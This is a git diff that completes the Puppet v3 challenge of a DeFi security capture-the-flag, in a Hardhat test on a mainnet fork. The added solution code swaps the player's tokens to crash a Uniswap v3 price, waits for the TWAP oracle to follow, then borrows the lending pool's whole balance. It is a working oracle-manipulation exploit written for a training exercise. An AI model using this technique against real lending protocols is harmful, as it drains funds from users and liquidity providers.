@@ -5,6 +5,7 @@ const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers")
 const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
 const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");
+const routerJson = require("@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json");
 
 // See https://github.com/Uniswap/v3-periphery/blob/5bcdd9f67f9394f3159dad80d0dd01d37ca08c66/test/shared/encodePriceSqrt.ts
 const bn = require("bignumber.js");
@@ -26,7 +27,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://eth.llamarpc.com";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -70,7 +71,7 @@ describe('[Challenge] Puppet v3', function () {
 
         // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-        
+
         // Create the Uniswap v3 pool
         uniswapPositionManager = new ethers.Contract("0xC36442b4a4522E871399CD717aBDD847Ab11FE88", positionManagerJson.abi, deployer);
         const FEE = 3000; // 0.3%
@@ -89,7 +90,7 @@ describe('[Challenge] Puppet v3', function () {
         );
         uniswapPool = new ethers.Contract(uniswapPoolAddress, poolJson.abi, deployer);
         await uniswapPool.increaseObservationCardinalityNext(40);
-        
+
         // Deployer adds liquidity at current price to Uniswap V3 exchange
         await weth.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
         await token.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
@@ -105,7 +106,7 @@ describe('[Challenge] Puppet v3', function () {
             amount0Min: 0,
             amount1Min: 0,
             deadline: (await ethers.provider.getBlock('latest')).timestamp * 2,
-        }, { gasLimit: 5000000 });        
+        }, { gasLimit: 5000000 });
 
         // Deploy the lending pool
         lendingPool = await (await ethers.getContractFactory('PuppetV3Pool', deployer)).deploy(
@@ -140,6 +141,35 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const routerAddress = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
+        const router = await ethers.getContractAt(routerJson.abi, routerAddress, player);
+
+        await token.connect(player).approve(routerAddress, PLAYER_INITIAL_TOKEN_BALANCE);
+        await weth.connect(player).approve(lendingPool.address, UNISWAP_INITIAL_WETH_LIQUIDITY);
+        
+        // https://etherscan.io/address/0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45#writeContract
+        await router.exactInputSingle([
+            token.address, // tokenIn
+            weth.address, // tokenOut
+            3000, // fee
+            player.address, // recipient
+            PLAYER_INITIAL_TOKEN_BALANCE, // amountIn
+            0, // amountOutMinimum
+            0, // sqrtPriceLimitX96
+        ])
+
+        await time.increase(90);
+
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        /*
+        Explanation:
+        We dump our tokens.
+        We wait for the time weighted average price to reflect the dump.
+        We borrow everything from the pool.
+        Nothing special here.
+        */
     });
 
     after(async function () {
